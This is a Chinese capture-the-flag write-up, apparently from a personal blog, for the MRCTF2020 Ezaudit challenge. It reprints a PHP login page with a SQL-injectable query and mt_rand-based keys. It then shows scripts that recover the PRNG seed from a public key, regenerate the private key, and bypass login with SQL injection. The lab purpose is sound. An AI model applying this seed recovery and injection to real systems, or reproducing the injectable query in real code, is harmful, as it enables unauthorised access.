---
title: '[MRCTF2020]Ezaudit'
date: 2024-07-23 18:22:42
tags: 题解
categories: 刷题笔记
---

## [MRCTF2020]Ezaudit

首先我们进行目录扫描，发现`www.zip`可以下载到源码

```
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```

通过审计代码，我们发现关键点一步是求出私钥，由于生成公钥使用的是mt_seed，即伪随机函数，我们只要通过公钥获取到种子值就能得到私钥

我们使用php_mt_seed这个脚本

我们先处理公钥数据成脚本需要的数据格式

<!--more-->

```
<?php
error_reporting(0);
$str_long1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$string='KVQP0LdJKRaV3n9D';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $pos=strpos($str_long1,$string[$i]);
    echo $pos." ".$pos." 0 61 " ;
}
?>
//36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
```

传入脚本，得到种子值1775196155

![image-20240723184320728](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407231843814.png)

我们将获得的种子传入私钥函数，就能得到私钥了

```
<?php
mt_srand(1775196155);
//公钥
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
}
//私钥
function private_key($length = 12) {

    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
}
echo public_key(),"||";
echo private_key();
?>

//KVQP0LdJKRaV3n9D||XuNhoueCDCGc
```

得到私钥后，我们用万能语句进行绕过

![image-20240723190133406](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407231901435.png)

就能得到flag了
